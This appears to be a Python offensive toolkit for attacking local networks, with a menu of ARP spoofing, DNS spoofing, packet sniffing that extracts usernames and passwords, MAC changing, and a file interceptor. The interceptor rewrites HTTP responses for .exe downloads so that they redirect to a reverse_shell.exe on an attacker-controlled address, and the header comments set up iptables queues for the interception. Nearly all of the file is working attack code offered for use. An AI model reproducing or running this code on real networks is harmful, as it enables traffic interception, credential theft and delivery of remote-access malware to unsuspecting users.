#For performing attack on local machine input and output chains to be used to create queue
#"iptables -I INPUT -j NFQUEUE --queue-num 0" - INPUT CHAIN 
#"iptables -I OUTPUT -j NFQUEUE --queue-num 0"- OUTPUT CHAIN
# For performing attacks on remote machine forward chain to be used to create queue
#"iptables -I FORWARD -j NFQUEUE --queue-num 0"- FORWARD CHAIN

import scapy.all as scapy 
import time
import sys
import netfilterqueue
import argparse
import optparse
from scapy.layers import http
import pyfiglet
from arp_spoof import spoof, restore
from network_scanner import scan, print_result
from packet_sniffer import get_url, get_login_info
from Mac_Changer import getmac, macchanger


if __name__ == "__main__":
    banner = pyfiglet.figlet_format("Network Attacks", font = "slant"  ) 
    print(banner) 
    print("Welcome to Network Attacks in Local Area Network")
    print("Please select from below options")
    print("{0:<15} : {1:<15}".format("[+] ARP Spoofing","Press 1"))
    print("{0:<15} : {1:<15}".format("[+] DNS Spoofing","Press 2"))
    print("{0:<15} : {1:<15}".format("[+] File interceptor","Press 3"))
    print("{0:<15} : {1:<15}".format("[+] Newtork scanner","Press 4"))
    print("{0:<15} : {1:<15}".format("[+] Packet sniffer","Press 5"))
    print("{0:<15} : {1:<15}".format("[+] Mac Changer","Press 6"))
    # print("Enter Your Choice ---> ")
    n = int(input("Enter Your Choice ---> "))

    #ARP Spoofing
    if n == 1:
        def arpSpoof():
            target_ip = input("Enter the target ip to spoof ---> ")
            gateway_ip = input("Enter the gateway ip  ---> ")
            try:
                sent_packets_count = 0
                while True:
                    spoof(target_ip, gateway_ip)
                    spoof(gateway_ip, target_ip)
                    sent_packets_count = sent_packets_count + 2
                    print("\r[+] Packets sent:" + str(sent_packets_count)),
                    sys.stdout.flush()
                    time.sleep(2)
            except KeyboardInterrupt:
                print("\n[-] Detected CTRl + C... Reseting ARP tables...Please wait.\n")
                restore(target_ip, gateway_ip)
                restore(gateway_ip, target_ip)
        arpSpoof()

    #DNS Spoofing
    elif n == 2:
        #parser=argparse.ArgumentParser()    
        #parser.add_argument("-s","--spoof",dest="swebsite",help="Specify an website to spoof")  
        #parser.add_argument("-r","--redirect",dest="dwebsite",help="Specify an website to redirect the user")
        #options = parser.parse_args()
        swebsite = input("Enter website to spoof ---> ")
        dwebsite = input("Enter website to redirect the user ---> ")
        def process_packet(packet):
            scapy_packet = scapy.IP(packet.get_payload())
            # to check if packet has DNS Response Record(DNSRR)
            if scapy_packet.haslayer(scapy.DNSRR):
                qname = scapy_packet[scapy.DNSQR].qname
                if swebsite+"." == qname:
                    print ("[+] Spoofing target")
                    answer = scapy.DNSRR(rrname=qname, rdata=dwebsite)
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum
                    packet.set_payload(str(scapy_packet))
            packet.accept()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

    #----File Interceptor-----
    elif n == 3:
        ack_list = []
        def set_load(packet, load):
            #setting packet to 
            packet[scapy.Raw].load = load
            # deleting some fields of IP and TCP header
            del packet[scapy.IP].len
            del packet[scapy.IP].chksum
            del packet[scapy.TCP].chksum
            return packet
        def process_packet(packet):
            scapy_packet = scapy.IP(packet.get_payload())
            #if scapy_packet.haslayer(scapy.Raw):
            if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
                if scapy_packet[scapy.TCP].dport == 80:
                    if ".exe" in scapy_packet[scapy.Raw].load:
                        print ("[+] exe request")
                        ack_list.append(scapy_packet[scapy.TCP].ack)

                elif scapy_packet[scapy.TCP].sport == 80:
                    if scapy_packet[scapy.TCP].seq in ack_list:
                        ack_list.remove(scapy_packet[scapy.TCP].seq)
                        print ("[+] Replacing files")
                        # redirecting request to my file location
                        modified_packet = set_load(
                            scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.44.141/evil-files/reverse_shell.exe\n\n")
                        # sent the modified packet
                        packet.set_payload(str(modified_packet))

            packet.accept()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

    #-----Network Scanner-------
    elif n == 4:
        #scan_result = scan("192.168.133.1/24")
        def networkScan():
            #options = get_arguments()
            target = input("Enter Target-IP Range ---> ")
            scan_result = scan(target)
            print_result(scan_result)
        networkScan()

    #-----Packet Sniffer-----
    elif n ==5:
        def sniff(interface):
                scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
        
        def process_sniffed_packet(packet):
                if packet.haslayer(http.HTTPRequest):
                        #print(packet.show())
                        #In http request layer fields such as Host contain the 1st part of url(i.e domain name) and path contains the rest of url
                        url = get_url(packet)
                        print("[+] HTTP Request >>> " + format(url))
                        login_info = get_login_info(packet)
                        if login_info:
                                print("\n\n[+] Possible username/password >> " + format(login_info) + "\n\n")

        interface = input("Enter the interface on which you want to sniff traffic --->")	    
        sniff(interface)

    #-----Mac Changer-----    
    elif n==6:
        interface = input("Enter the interface to change the mac address ---> ")
        new_mac = input("Enter the new MAC address ---> ")
        macchanger(interface,new_mac)
        #main program which change the mac address

        final_mac = getmac(interface)
        #verify whether the mac is changed or Not

        if final_mac == new_mac :
            print ("Mac Address Successfully Chaged with new one -> %r"%final_mac)
        else:
            print ("Error Occured Fix It !!!")
    else:
        print("Invalid selection. Please run script one more time")

